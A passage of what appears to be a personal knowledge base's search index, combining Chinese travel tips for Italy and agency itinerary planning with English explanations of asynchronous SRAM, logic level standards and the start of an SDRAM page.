\u200b\u6b27\u5143\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6700\u597d\u200b\u81ea\u5907\u200b\u96f6\u94b1\u200b\uff0c\u200b\u90e8\u5206\u200b\u5395\u6240\u200b\u6709\u200b\u5de5\u4f5c\u4eba\u5458\u200b\u5e2e\u52a9\u200b\u627e\u96f6\u200b\u3002\u200b\u5efa\u8bae\u200b\u517b\u6210\u200b\u4e60\u60ef\u200b\uff0c\u200b\u5728\u200b\u79bb\u5f00\u200b\u9152\u5e97\u200b\u6216\u8005\u200b\u5403\u5b8c\u996d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u53bb\u200b\u4e0a\u200b\u4e00\u6b21\u200b\u5395\u6240\u200b\u3002</p>"},{"location":"travel/italy.html#_11","title":"\u8bed\u8a00","text":"<p>\u200b\u610f\u5927\u5229\u8bed\u200b\u548c\u200b\u897f\u73ed\u7259\u8bed\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u5b66\u8fc7\u200b\u897f\u73ed\u7259\u8bed\u200b\uff0c\u200b\u4f1a\u200b\u89c9\u5f97\u200b\u53d1\u97f3\u200b\u89c4\u5219\u200b\u5341\u5206\u200b\u76f8\u8fd1\u200b\uff0c\u200b\u5f88\u591a\u200b\u8bcd\u8bed\u200b\u4e5f\u200b\u957f\u200b\u7684\u200b\u5f88\u200b\u50cf\u200b\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b\u610f\u5927\u5229\u8bed\u200b\uff1a</p> <ol> <li>Ciao\uff1a\u200b\u4f60\u597d\u200b/\u200b\u518d\u89c1\u200b</li> <li>Buongiorno\uff1a\u200b\u65e9\u4e0a\u597d\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u4e0b\u5348\u200b\u4e5f\u200b\u4f1a\u200b\u8bf4\u200b</li> <li>Grazie\uff1a\u200b\u8c22\u8c22\u200b</li> <li>Uscita\uff1a\u200b\u51fa\u53e3\u200b</li> <li>Biglietti\uff1a\u200b\u7968\u52a1\u200b</li> <li>Via\uff1a\u200b\u8def\u200b</li> <li>Piazza\uff1a\u200b\u5e7f\u573a\u200b</li> <li>Duomo\uff1a\u200b\u5927\u200b\u6559\u5802\u200b</li> <li>Ristorante\uff1a\u200b\u9910\u5385\u200b</li> </ol> <p>\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b\u610f\u5927\u5229\u200b\u7684\u200b\u4e3b\u8981\u200b\u57ce\u5e02\u200b\u7684\u200b\u4e2d\u82f1\u200b\u610f\u6587\u200b\u5bf9\u7167\u200b\uff1a</p> <ol> <li>\u200b\u7f57\u9a6c\u200b Rome Roma</li> <li>\u200b\u4f5b\u7f57\u4f26\u8428\u200b Florence Firenze</li> <li>\u200b\u7c73\u5170\u200b Milan Milano</li> <li>\u200b\u90fd\u7075\u200b Turin Turino</li> <li>\u200b\u5a01\u5c3c\u65af\u200b Venice Venezia</li> <li>\u200b\u535a\u6d1b\u5c3c\u4e9a\u200b Bologna Bologna</li> <li>\u200b\u6bd4\u8428\u200b Pisa Pisa</li> </ol>"},{"location":"travel/italy.html#_12","title":"\u9632\u76d7","text":"<p>\u200b\u65c5\u884c\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u9632\u76d7\u200b\uff0c\u200b\u628a\u200b\u91cd\u8981\u200b\u7269\u54c1\u200b\u968f\u8eab\u5e26\u200b\uff0c\u200b\u5e76\u4e14\u200b\u653e\u5230\u200b\u8eab\u524d\u200b\u3002\u200b\u5c3d\u91cf\u200b\u4e0d\u8981\u200b\u53bb\u200b\u5c0f\u5077\u200b\u591a\u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627e\u200b\u6709\u200b\u7ecf\u9a8c\u200b\u7684\u200b\u4e2d\u56fd\u200b\u5bfc\u6e38\u200b\uff0c\u200b\u4ed6\u4eec\u200b\u53ef\u4ee5\u200b\u8bc6\u522b\u200b\u5c0f\u5077\u200b\u3002</p>"},{"location":"travel/italy.html#_13","title":"\u5730\u56fe","text":"<p>\u200b\u5728\u200b\u610f\u5927\u5229\u200b\u5168\u7a0b\u200b\u7528\u200b Google Map \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6bcf\u5929\u200b\u6574\u7406\u200b\u7b2c\u4e8c\u5929\u200b\u7684\u200b\u884c\u7a0b\u200b\uff0c\u200b\u628a\u200b\u8981\u200b\u53bb\u200b\u7684\u200b\u5730\u65b9\u200b\u90fd\u200b\u5728\u200b\u5730\u56fe\u200b\u4e0a\u200b\u6253\u200b\u597d\u200b\u6807\u8bb0\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u627e\u5230\u200b\u60f3\u200b\u53bb\u200b\u7684\u200b\u666f\u70b9\u200b\u3002\u200b\u5404\u4e2a\u200b\u57ce\u5e02\u200b\u9700\u8981\u200b\u6253\u5361\u200b\u6216\u8005\u200b\u503c\u5f97\u200b\u53bb\u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5c0f\u7ea2\u200b\u4e66\u4e0a\u200b\u641c\u7d22\u200b\u3002\u200b\u610f\u5927\u5229\u200b\u5f88\u591a\u200b\u5730\u65b9\u200b\u90fd\u200b\u6709\u200b\u5f53\u5730\u200b\u666f\u70b9\u200b\u4e3b\u9898\u200b\u7684\u200b\u73bb\u7483\u200b\u51b0\u7bb1\u200b\u8d34\u200b\uff0c\u200b\u559c\u6b22\u200b\u7684\u8bdd\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u6536\u96c6\u200b\u3002\u200b\u4e0b\u9762\u200b\u5217\u51fa\u6765\u200b\u4e00\u4e9b\u200b\u4ece\u5c0f\u7ea2\u200b\u4e66\u200b\u7b49\u200b\u9014\u5f84\u200b\u77e5\u9053\u200b\u7684\u200b\u6bd4\u8f83\u200b\u70ed\u95e8\u200b\u6216\u200b\u503c\u5f97\u200b\u53bb\u200b\u7684\u200b\u5730\u65b9\u200b/\u200b\u9879\u76ee\u200b/\u200b\u5c0f\u5e97\u200b\uff08\u200b\u9664\u200b\u70ed\u95e8\u200b\u666f\u70b9\u200b\uff09\uff1a</p> <ol> <li>Lake Como\uff1a\u200b\u5750\u200b\u6e38\u8247\u200b\u6e38\u89c8\u200b Lake Como</li> <li>Milan<ol> <li>Duomo Shop\uff1a\u200b\u5927\u200b\u6559\u5802\u200b\u76f8\u5173\u200b\u7684\u200b\u7eaa\u5ff5\u54c1\u200b</li> <li>Piumelli/Pettinaroli\uff1a\u200b\u76ae\u5177\u200b</li> </ol> </li> <li>Turin<ol> <li>Allianz Stadium\uff1a\u200b\u5c24\u6587\u56fe\u65af\u200b\u4e3b\u573a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u200b\u6bd4\u8d5b\u200b</li> </ol> </li> <li>Venice<ol> <li>Burano \u200b\u5c9b\u200b</li> <li>Libreria Acqua Alta\uff1a\u200b\u6c89\u8239\u200b\u4e66\u5e97\u200b</li> <li>Il Baule d'Oriente\uff1a\u200b\u73e0\u5b9d\u200b</li> </ol> </li> <li>Pisa<ol> <li>113 viasantamaria\uff1a\u200b\u7eaa\u5ff5\u54c1\u200b\u5e97\u200b</li> </ol> </li> <li>Florence<ol> <li>Trattoria Osteria Dall'Oste SMN\uff1a\u200b\u996d\u5e97\u200b\uff0c\u200b\u6709\u200b\u6982\u7387\u200b\u5237\u51fa\u200b\u660e\u661f\u200b</li> </ol> </li> <li>Siena<ol> <li>La Fabbrica delle Candele\uff1a\u200b\u8721\u70db\u200b</li> </ol> </li> <li>Rome<ol> <li>Gran Cafe Marcel\uff1a\u200b\u7eaa\u5ff5\u54c1\u200b\u5e97\u200b</li> <li>Nobile\uff1a\u200b\u76ae\u5177\u200b\u5e97\u200b</li> <li>OhMyGuide - Roma Mesume Store\uff1a\u200b\u7eaa\u5ff5\u54c1\u200b\u5e97\u200b</li> <li>Bottega Pinocchio\uff1a\u200b\u5339\u8bfa\u200b\u66f9\u200b</li> <li>HUMILIS\uff1a\u200b\u624b\u94fe\u200b</li> </ol> </li> <li>\u200b\u610f\u5927\u5229\u200b\u5404\u5730\u200b\u7684\u200b\u8fde\u9501\u5e97\u200b<ol> <li>L'erbolario\uff1a\u200b\u9999\u6c34\u200b</li> </ol> </li> </ol>"},{"location":"travel/itinerary.html","title":"\u884c\u7a0b","text":"<p>\u200b\u51fa\u884c\u200b\u524d\u200b\uff0c\u200b\u9700\u8981\u200b\u548c\u200b\u65c5\u884c\u793e\u200b\u786e\u5b9a\u200b\u884c\u7a0b\u200b\u3002\u200b\u901a\u5e38\u200b\u6765\u8bf4\u200b\uff0c\u200b\u65c5\u884c\u793e\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u5b9a\u597d\u200b\u7684\u200b\u5927\u56e2\u200b\uff0c\u200b\u4eba\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u884c\u7a0b\u200b\u6bd4\u8f83\u200b\u56fa\u5b9a\u200b\uff0c\u200b\u4ef7\u683c\u4f4e\u200b\u4e00\u4e9b\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u627e\u200b\u65c5\u884c\u793e\u200b\u5b9a\u5236\u200b\u884c\u7a0b\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u5176\u4ed6\u4eba\u200b\uff0c\u200b\u53ea\u6709\u200b\u65c5\u884c\u793e\u200b\u7684\u200b\u5730\u966a\u200b\uff0c\u200b\u5730\u966a\u200b\u7684\u200b\u4e3b\u8981\u200b\u8eab\u4efd\u200b\u662f\u200b\u53f8\u673a\u200b\uff0c\u200b\u517c\u4efb\u200b\u4e00\u4e9b\u200b\u5bfc\u6e38\u200b\u7684\u200b\u804c\u80fd\u200b\u3002\u200b\u5b9a\u5236\u200b\u884c\u7a0b\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u7684\u200b\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u5f00\u59cb\u200b\u548c\u200b\u7ed3\u675f\u200b\u65f6\u95f4\u200b\uff0c\u200b\u6ce8\u610f\u200b\u8981\u200b\u80fd\u591f\u200b\u88ab\u200b\u7b7e\u8bc1\u200b\u6709\u6548\u671f\u200b\u8986\u76d6\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5047\u671f\u200b\u5b89\u6392\u200b</li> <li>\u200b\u822a\u73ed\u200b\uff0c\u200b\u6ce8\u610f\u200b\u76f4\u98de\u200b\u672a\u5fc5\u200b\u662f\u200b\u6700\u200b\u4fbf\u5b9c\u200b\u7684\u200b\uff0c\u200b\u8f6c\u673a\u200b\u7684\u200b\u5957\u7968\u200b\u53ef\u80fd\u200b\u66f4\u200b\u4fbf\u5b9c\u200b\uff0c\u200b\u4f46\u662f\u200b\u65f6\u95f4\u200b\u4e5f\u200b\u66f4\u957f\u200b\uff1b\u200b\u5efa\u8bae\u200b\u7efc\u5408\u200b\u8003\u8651\u200b\u591a\u5bb6\u200b\u822a\u53f8\u200b\u548c\u200b\u4e0d\u540c\u200b\u7684\u200b\u822a\u7ebf\u200b</li> <li>\u200b\u9152\u5e97\u200b\uff0c\u200b\u5efa\u8bae\u200b\u8981\u6c42\u200b\u65c5\u884c\u793e\u200b\u63d0\u4f9b\u200b\u9152\u5e97\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5728\u200b Booking \u200b\u7b49\u200b\u7f51\u7ad9\u200b\u4e0a\u200b\u67e5\u8be2\u200b\u8bc4\u5206\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8981\u6c42\u200b\u53bb\u200b\u4e00\u4e9b\u200b\u7279\u8272\u200b\u7684\u200b\u672c\u5730\u200b\u9152\u5e97\u200b</li> <li>\u200b\u5177\u4f53\u200b\u884c\u7a0b\u200b\uff0c\u200b\u6ce8\u610f\u200b\u6bcf\u5929\u200b\u53bb\u200b\u54ea\u4e9b\u200b\u57ce\u5e02\u200b\uff0c\u200b\u5728\u200b\u54ea\u91cc\u200b\u4f4f\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u8f66\u7a0b\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u4e00\u5929\u200b\u4e0d\u5b9c\u200b\u5b89\u6392\u200b\u8fc7\u591a\u200b\u884c\u7a0b\u200b\uff0c\u200b\u5426\u5219\u200b\u4f1a\u200b\u75b2\u4e8e\u5954\u547d\u200b</li> <li>\u200b\u95e8\u7968\u200b\uff0c\u200b\u90e8\u5206\u200b\u666f\u70b9\u200b\u9700\u8981\u200b\u95e8\u7968\u200b\uff0c\u200b\u6709\u200b\u7684\u200b\u8fd8\u200b\u9700\u8981\u200b\u63d0\u524d\u200b\u9884\u7ea6\u200b\uff0c\u200b\u9700\u8981\u200b\u63d0\u524d\u200b\u548c\u200b\u65c5\u884c\u793e\u200b\u6c9f\u901a\u200b\u4ef7\u683c\u200b\u548c\u200b\u9884\u7ea6\u200b\u7684\u200b\u4e8b\u5b9c\u200b</li> </ol> <p>\u200b\u7533\u8bf7\u200b\u90e8\u5206\u200b\u56fd\u5bb6\u200b\u7684\u200b\u65c5\u6e38\u200b\u7b7e\u8bc1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u9700\u8981\u200b\u4e00\u4efd\u200b\u884c\u7a0b\u200b\u3001\u200b\u673a\u7968\u200b\u548c\u200b\u9152\u5e97\u200b\u9884\u8ba2\u5355\u200b\uff0c\u200b\u901a\u5e38\u200b\u5b83\u4eec\u200b\u4e0d\u200b\u9700\u8981\u200b\u548c\u200b\u5b9e\u9645\u200b\u7684\u200b\u884c\u7a0b\u200b\u4e00\u81f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63d0\u524d\u200b\u505a\u200b\u4e00\u4efd\u200b\u884c\u7a0b\u200b\u5e76\u200b\u9884\u7ea6\u200b\u53ef\u4ee5\u200b\u5168\u989d\u200b\u9000\u6b3e\u200b\u7684\u200b\u9152\u5e97\u200b\uff0c\u200b\u518d\u200b\u7533\u8bf7\u200b\u7b7e\u8bc1\u200b\uff0c\u200b\u65c5\u884c\u793e\u200b\u6709\u200b\u76f8\u5173\u200b\u7684\u200b\u7b7e\u8bc1\u200b\u7533\u8bf7\u6750\u6599\u200b\u670d\u52a1\u200b\u3002</p>"},{"location":"en/index.html","title":"Home","text":"<p>It is the Knowledge Base of @jiegec.</p> <p>Find the desired content in the menu above.</p>"},{"location":"en/hardware/async_sram.html","title":"Asynchronous SRAM","text":""},{"location":"en/hardware/async_sram.html#features","title":"Features","text":"<p>Features of asynchronous SRAM:</p> <ol> <li>Simple interface: the controller gives the address and control signals, and the data is available after a fixed delay, no calibration is required</li> <li>MB level RAM available: single chip can provide KB to MB level RAM, larger capacity can be obtained by connecting multiple SRAMs in parallel</li> <li>High-speed asynchronous SRAM with latency in the 10ns range</li> </ol>"},{"location":"en/hardware/async_sram.html#structure","title":"Structure","text":"<p>The asynchronous SRAM holds data internally as an array. For example, a 2048K x 16 asynchronous SRAM has 2048K rows, each row holds 16 bits of data, for a total of \\(2048\\mathrm{K} * 16\\mathrm{b} = 32 \\mathrm{Mb}\\) of data.</p> <p>The structure of the asynchronous SRAM is shown in Figure 1. When the controller accesses the asynchronous SRAM, it gives a row address and the asynchronous SRAM reads a row of data. Since there are 2048K rows, the number of bits needed for the address is \\(\\log_2(2048\\mathrm{K})=21\\), which corresponds to <code>A0-A20</code> in the figure below. The address is passed to <code>DECODER</code>, which takes the data to be accessed from the array and puts it in <code>COLUMN IO</code>.</p> <p> </p> Asynchronous SRAM Diagram (Source ISSI Datasheet) <p>For read operations, the memory controller provides the address on <code>A0-A20</code>, reads the data through <code>DECODER</code> from <code>2048K x 16 MEMORY ARRAY</code> to <code>COLUMN IO</code>, and the control logic <code>CONTROL CIRCUIT</code> outputs the data to <code>I/O DATA CIRCUIT</code> according to the read operation (<code>WE#=1, OE#=0</code>).</p> <p>For write operations, the memory controller provides the address on <code>A0-A20</code>, the data to be written on <code>I/O</code>, and the byte enable on <code>UB#/LB#</code>. The asynchronous SRAM reads the existing data in the array from <code>MEMORY ARRAY</code>, combines <code>UB#/LB#</code> with <code>I/O</code>, calculates the new value, and writes it to memory. The <code>UB#</code> and <code>LB#</code> are byte enables (active-low) for high 8 bits and low 8 bits respectively. If the old data is <code>1234</code> and the value to be written by the memory controller is <code>5678</code>, then the value in memory is updated to</p> UB# LB# Result Description 0 0 5678 New Value 1 0 1278 Only low byte written 0 1 5634 Only high byte written 1 1 1234 Unchanged"},{"location":"en/hardware/async_sram.html#interface","title":"Interface","text":"<p>Asynchronous SRAM exposes a single-port RAM interface that can only read or write at a time. A typical asynchronous SRAM includes the following signals:</p> <ol> <li>Address signal A: the bit width is determined by the depth, for example, 2048K depth corresponds to 21-bit address</li> <li>Data signal I/O: the bit width is equal to the width of SRAM, e.g. 8 or 16 bits</li> <li>Chip select CS# (or CE#): active-low, works when CS# is equal to 0</li> <li>Output enable OE#: active-low, SRAM output when OE# equals 0, SRAM input when OE# equals 1</li> <li>Write enable WE#: active-low, WE# equals 0 for write, WE# equals 1 for read</li> <li>Byte enable UB#/LB#: active-low, corresponding to two bytes, update when equal to 0, unchanged when equal to 1</li> </ol> <p>Some asynchronous SRAMs are 8 bits wide, where there is no byte enable signal.</p>"},{"location":"en/hardware/async_sram.html#concatenation","title":"Concatenation","text":"<p>If you want a larger asynchronous SRAM, you can concatenate multiple asynchronous SRAMs. Concatenation can be done in two ways:</p> <p>One is to concatenate in width, e.g. concatenate two asynchronous SRAMs of the same depth and width of 16 to get an asynchronous SRAM of width 32:</p> <p> </p> Concatenate asynchronous SRAM in width <p>The address signal (A) and control signals (OE#, WE#, CE#) are connected to all asynchronous SRAMs, while the data signal (DQ) and byte enable signals (WE0-3#) are connected to different asynchronous SRAMs to form twice the data width.</p> <p>The other is to concatenate in the depth, keeping the width the same, to increase the storage capacity. For example, concatenate two asynchronous SRAMs to get an asynchronous SRAM with doubled depth. For each access, only one of the asynchronous SRAMs will be accessed, distinguished by the address.</p> <p>For example, to concatenate two asynchronous SRAMs with 21-bit addresses to get a asynchronous SRAM with 22-bit addresses, if the highest bit of the address is used to select which asynchronous SRAM to access, then you can set: <code>CS0#=CS# | A[21], CS1#=CS# | ~A[21]</code>, and the rest of the signals are connected to all the asynchronous SRAMs. When <code>CS#=1</code>, the output pins are in the high resistance state, so multiple chips can share a single data bus and only need to ensure that only one chip on the bus is outputting at the same time:</p> <p> </p> Concatenate asynchronous SRAM in depth <p>In practice, it is possible to mix the two methods.</p>"},{"location":"en/hardware/async_sram.html#timing","title":"Timing","text":""},{"location":"en/hardware/async_sram.html#read-timing","title":"Read Timing","text":"<p>The asynchronous SRAM is called asynchronous because it has no clock signal. In this case, the read timing is reflected as the delay between the controller giving the address and the asynchronous SRAM giving the data. Take IS61/64WV204816ALL Asynchronous SRAM chip as an example, the read timing is shown in the following figure:</p> <p> </p> Read Timing of Asynchronous SRAM (Source ISSI Datasheet) <ul> <li>\\(t_{RC}\\): read cycle time, the address remains unchanged during this time, Min 10ns</li> <li>\\(t_{AA}\\): address access time, the data is given after the address change in \\(t_{AA}\\) time, Max 10ns</li> <li>\\(t_{OHA}\\): output hold time, the data remains unchanged during this time, Min 2.5ns</li> </ul> <p>The output data is uncertain during the period between the end of \\(t_{OHA}\\) and the end of \\(t_{AA}\\).</p>"},{"location":"en/hardware/async_sram.html#write-timing","title":"Write timing","text":"<p>The write timing is more complicated, and there can be multiple write conditions, one of which is listed below:</p> <p> </p> Write timing of asynchronous SRAM (Source ISSI Datasheet) <p>The core of the write timing is the rising edge of <code>WE#</code>. Compared with this time point, there are the following important timing requirements:</p> <ul> <li>\\(t_{WC}\\): The address needs to remain unchanged for \\(t_{WC}\\), Min 10ns</li> <li>\\(t_{AW}\\): The setup time of the address relative to the rising edge of <code>WE#</code>, Min 8ns</li> <li>\\(t_{HA}\\): Hold time of the address relative to the rising edge of <code>WE#</code>, Min 0ns</li> <li>\\(t_{PWE}\\): The time when <code>WE#</code> maintains 0, Min 8ns</li> <li>\\(t_{SD}\\): Setup time of data relative to the rising edge of <code>WE#</code>, Min 6ns</li> <li>\\(t_{HD}\\): Hold time of data relative to the rising edge of <code>WE#</code>, Min 0ns</li> <li>\\(t_{SA}\\): Setup time of the address relative to the falling edge of <code>WE#</code>, Min 0ns</li> </ul>"},{"location":"en/hardware/async_sram.html#sram-cell","title":"SRAM Cell","text":"<p>A typical SRAM Cell consists of 6 transistors, and the internal structure is as follows:</p> <p> </p> Internal Structure of 6T SRAM Cell (Source Berkeley EECS 151/251A Spring 2019) <p>Among them, M1 and M2 form an inverter, M3 and M4 form another inverter, and two inverters form the following equivalent circuit:</p> <p> </p> Circuit in SRAM Cell (Source Berkeley EECS 151/251A Spring 2019) <p>This is a latch that can stably store 1 bit of data. The two transistors M5 and M6 are used for reading and writing. When WL is enabled, M5 and M6 are turned on, BL and Q are connected, and BLbar and Qbar are connected. At this point, you can read and write through BL and BLbar.</p>"},{"location":"en/hardware/async_sram.html#acknowledgement","title":"Acknowledgement","text":"<p>The English version is kindly translated with the help of DeepL Translator and Google Translate.</p>"},{"location":"en/hardware/logic_levels.html","title":"Logic level standards","text":"<p>The logic level standard defines how to convert the digital signal 0 or 1 into high and low levels, and how to convert the high and low levels back to 0 or 1 between different chips.</p> <p>The first part is for output, to convert 0 or 1 into high and low levels, so it is necessary to define the range:</p> <ul> <li>Output 0: The maximum voltage is \\(V_{OL}\\), Output Low Voltage</li> <li>Output 1: The minimum voltage is \\(V_{OH}\\), Output High Voltage</li> </ul> <p>Conversely, when converting the level to 0 or 1, the range must also be defined:</p> <ul> <li>If the voltage is higher than \\(V_{IH}\\), it is considered 1</li> <li>If the voltage is below \\(V_{IL}\\), it is considered 0</li> </ul> <p>Usually, the above four items satisfy \\(V_{OL} &lt; V_{IL} &lt; V_{IH} &lt; V_{OH}\\), that is to say, the range of input will be larger and more tolerant than that of output, providing certain fault tolerance.</p>"},{"location":"en/hardware/logic_levels.html#ttl-logic-level","title":"TTL logic level","text":"<p>5V TTL logic level is common. Take the data from https://learn.sparkfun.com/tutorials/logic-levels/ttl-logic-levels as an example, its level range is:</p> <ul> <li>Output 0: \\(V_{OL}=0.4\\), \\([0, 0.4]\\mathrm{V}\\)</li> <li>Output 1: \\(V_{OH}=2.7\\), \\([2.7, 5]\\mathrm{V}\\)</li> <li>Input 0: \\(V_{IL}=0.8\\), \\([0, 0.8]\\mathrm{V}\\)</li> <li>Input 1: \\(V_{IH}=2.0\\), \\([2, 5]\\mathrm{V}\\)</li> </ul> <p>\\(V_{OH}=2.4\\) in the data on Wikipedia.</p> <p>The FT232H chip supports TTL, the parameters are as follows:</p> <ul> <li>\\(V_{OL}=0.4\\), \\(V_{OH}=2.4\\)</li> <li>\\(V_{IL}=0.8\\), \\(V_{OL}=2.0\\)</li> </ul>"},{"location":"en/hardware/logic_levels.html#cmos-logic-level","title":"CMOS logic level","text":"<p>CMOS logic level is more common nowadays. Take Artix-7 FPGAs as an example, it supports multiple CMOS level standards:</p> <ul> <li>LVCMOS12: \\(V_{OL}=0.4, V_{OH}=V_{CCO}-0.4, V_{IL}=0.35V_{CCO}, V_{IH}=0.65V_{CCO}\\)</li> <li>LVCMOS15: \\(V_{OL}=0.25V_{CCO}, V_{OH}=0.75V_{CCO}, V_{IL}=0.35V_{CCO}, V_{IH}=0.65V_{CCO}\\)</li> <li>LVCMOS18: \\(V_{OL}=0.45, V_{OH}=V_{CCO}-0.45, V_{IL}=0.35V_{CCO}, V_{IH}=0.65V_{CCO}\\)</li> <li>LVCMOS25: \\(V_{OL}=0.4, V_{OH}=V_{CCO}-0.4, V_{IL}=0.7, V_{IH}=1.7\\)</li> <li>LVCMOS33: \\(V_{OL}=0.4, V_{OH}=V_{CCO}-0.4, V_{IL}=0.8, V_{IH}=2.0\\)</li> </ul> <p>Among them, \\(V_{CCO}\\) is the external input voltage, which matches the two digits behind LVCMOS, and LVCMOS33 corresponds to 3.3 V. Each Bank has the same \\(V_{CCO}\\) voltage, which is why IOSTANDARD is written in the constraint file, and often consecutive signals use the same logic level standard.</p> <p>In some cases, TTL level standards and CMOS level standards are compatible as long as their voltage range meets the requirements and can accept higher input voltages. For details, see Can I Use 3.3V TTL to Trigger a 3.3V CMOS Device and Logic Guide - Texas Instruments:</p> <p> </p> Compatibility between different TTL and CMOS levels (Source Logic Guide - Texas Instruments)"},{"location":"en/hardware/logic_levels.html#rs232","title":"RS232","text":"<p>RS232 is special, its logic level can be positive or negative:</p> <ul> <li>Output 0: \\([-15, -5] \\mathrm{V}\\)</li> <li>Output 1: \\([5, 15] \\mathrm{V}\\)</li> <li>Input 0: \\([-15, -3] \\mathrm{V}\\)</li> <li>Input 1: \\([3, 15] \\mathrm{V}\\)</li> </ul> <p>Therefore, if you want to connect RS232 peripherals to FPGA, you usually need to perform level conversion (for example MAX3232 3-V to 5.5-V Multichannel RS-232 Line Driver and Receiver With \u00b115-kV ESD Protection), otherwise it will not work properly.</p>"},{"location":"en/hardware/logic_levels.html#rs485","title":"RS485","text":"<p>RS485 is transmitted through differential signals, that is, a pair of data signals is used to represent 0 or 1 of the digital signal by the difference between the two. It requires that the number 1 corresponds to the differential voltage \\(V_{a} - V_{b} \\le -200 \\mathrm{mV}\\), and the number 0 corresponds to the differential voltage \\(V_{a} - V_{b} \\ge +200 \\mathrm {mV}\\). The waveform is as follows:</p>"},{"location":"en/hardware/logic_levels.html#sstl","title":"SSTL","text":"<p>SSTL (Stub Series Terminated Logic) is the logic level standard used by SDRAM, and there are different versions:</p> <ul> <li>SSTL_15</li> <li>SSTL_18: \\(V_{DDQ} = 1.8 \\mathrm{V}\\), \\(V_{REF} = 0.9 \\mathrm{V}\\)</li> <li>SSTL_2: \\(V_{DDQ} = 2.5 \\mathrm{V}\\), \\(V_{REF} = 1.25 \\mathrm{V}\\)</li> <li>SSTL_3: \\(V_{DDQ} = 3.3 \\mathrm{V}\\), \\(V_{REF} = 1.5 \\mathrm{V}\\)</li> </ul> <p>SSTL also has a differential version for transmitting differential signals such as CK and DQS.</p>"},{"location":"en/hardware/logic_levels.html#lvds","title":"LVDS","text":"<p>LVDS (Low Voltage Differential Signaling) is also a common differential logic level standard. Since it uses differential transmission, there is a common-mode voltage and a differential-mode voltage. For example, the common-mode voltage of LVDS_25 is \\(1.2 \\mathrm{V}\\), and the differential-mode voltage is \\(0.45 \\mathrm{V}\\), which means that the voltages on the two data signals will be around \\(1.2-0.45/2 = 0.975 \\mathrm{V}\\) and \\(1.2+0.45/2 = 1.425 \\mathrm{V}\\).</p> <p>TMDS is similar to LVDS, but the voltage is different. TMDS is often used for DVI and HDMI signal transmission.</p>"},{"location":"en/hardware/logic_levels.html#acknowledgement","title":"Acknowledgement","text":"<p>The English version is kindly translated with the help of Google Translator.</p>"},{"location":"en/hardware/sdram.html#features","title":"Features","text":"<p>SDRAM features:</p> <ol> <li>low cost, each 1 bit cell requires only one CMOS transistor</li> <li>complex interface, you need to activate a row before accessing data, and then read the data in the row</li> <li>the controller is also complex and requires periodic memory refreshing</li> <li>large capacity, because the row and column multiplexed address lines, a single memory module can achieve GB level capacity</li> </ol>"},{"location":"en/hardware/sdram.html#standards","title":"Standards","text":"<p>SDRAM-related standards are developed by JEDEC:</p> <ul> <li>JESD79F: DDR SDRAM</li> <li>JESD79-2F: DDR2 SDRAM</li> <li>JESD79-3F: DDR3 SDRAM</li> <li>JESD79-4D: DDR4 SDRAM</li> <li>JESD79-5B: DDR5 SDRAM</li> </ul> <p>In addition to the DDR series, there is also a low-power LPDDR series:</p> <ul> <li>JESD209B: LPDDR SDRAM</li> <li>JESD209-2F: LPDDR2 SDRAM</li> <li>JESD209-3C: LPDDR3 SDRAM</li> <li>JESD209-4D: LPDDR4 SDRAM</li> <li>JESD209-5B: LPDDR5 SDRAM</li> </ul> <p>High-performance HBM is also based on SDRAM technology:</p> <ul> <li>JESD235D: HBM</li> <li>JESD238A: HBM3</li> <li>JESD270-4: HBM4</li> </ul> <p>GDDR SGRAM series:</p> <ul> <li>SDRAM3.11.5.8 R16.01: GDDR4 SGRAM</li> <li>JESD212C.01: GDDR5 SGRAM</li> <li>JESD232A.01: GDDR5X SGRAM</li> <li>JESD250D: GDDR6 SGRAM</li> </ul> <p>The following is an introduction to DDR series SDRAM.</p>"},{"location":"en/hardware/sdram.html#concepts","title":"Concepts","text":"<p>DDR SDRAM is often given a number to represent its performance, such as 2133 for DDR4-2133, and sometimes you will see the term 2400 MT/s. Both refer to the maximum number of data transfers per second that SDRAM can perform in millions of transfers per second. Since SDRAM uses DDR to transfer two copies of data per clock cycle, the actual clock frequency is divided by two, so 2133 MT/s corresponds to a clock frequency of 1066 MHz.</p> <p>Sometimes you will also see PC4-21333 written to describe memory sticks, where \\(21333 = 8*2666\\), which is 2666 MT/s, multiplied by 8 because the data bit width of a DDR memory module is 64 bits, so the theoretical memory bandwidth of a 2666 MT/s memory stick is \\(2666 \\mathrm{(MT/s)} * 64 \\mathrm{(bits)} / 8 \\mathrm{(bits/byte)} = 21333 \\mathrm{(MB/s)}\\). But there are times when PC4 is followed by MT/s.</p> <p>Different generations of memory modules have different locations for the notches on the bottom pins, so it is impossible to insert them in the wrong place.</p>"},{"location":"en/hardware/sdram.html#structure","title":"Structure","text":"<p>Taking DDR4 